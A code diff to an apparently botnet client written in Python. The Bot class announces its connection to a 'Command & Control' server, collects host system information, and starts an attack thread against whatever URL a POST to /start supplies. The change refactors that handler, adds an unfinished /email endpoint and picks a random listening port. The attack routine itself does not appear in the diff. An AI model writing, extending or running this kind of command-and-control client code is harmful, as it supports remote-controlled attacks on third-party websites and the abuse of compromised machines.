@@ -41,18 +41,26 @@ class Bot(BaseHTTPRequestHandler):
 
     def do_POST(self):
         if self.path == '/start':
+            self.__start_attack()
+        elif self.path == '/email':
             length = int(self.headers['Content-Length'])
             payload = json.loads(self.rfile.read(length).decode('utf-8'))
-
-            self.stop.clear()
-
-            attack = threading.Thread(target=Bot.__attack, args=(self, payload['url']))
-            attack.start()
+            # TODO send email to the given address
             self.send_response(200)
         else:
             self.send_response(404)
 
         self.end_headers()
+
+    def __start_attack(self):
+        length = int(self.headers['Content-Length'])
+        payload = json.loads(self.rfile.read(length).decode('utf-8'))
+
+        self.stop.clear()
+
+        attack = threading.Thread(target=Bot.__attack, args=(self, payload['url']))
+        attack.start()
+        self.send_response(200)
 
     def __info(self):
         info = platform.uname()._asdict()
@@ -93,12 +101,10 @@ def exit_handler():
 
 
 if __name__ == '__main__':
-    server_port = 8080
-
-    bot = HTTPServer(('', server_port), Bot)
+    bot = HTTPServer(('', 0), Bot)
 
     try:
-        start(server_port)
+        start(bot.server_port)
         print("Connected to the Command & Control")
         atexit.register(exit_handler)
         bot.serve_forever()
